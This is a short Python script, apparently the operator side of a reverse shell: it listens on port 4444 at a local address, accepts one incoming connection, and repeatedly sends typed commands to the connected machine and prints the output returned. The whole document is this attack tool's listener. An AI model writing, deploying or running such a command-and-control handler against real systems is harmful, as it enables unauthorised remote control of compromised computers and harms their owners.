import socket, subprocess

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(('192.168.0.102', 4444))
print('[+]Waiting connectiion')
socket.listen(5)
client, addr = socket.accept()
print('[+] Connect from'+ str(addr))
while True:
    command = str(input(">>"))
    client.send(command.encode())
    result_output = client.recv(1024).decode()
    print(result_output)
client.close()
socket.close()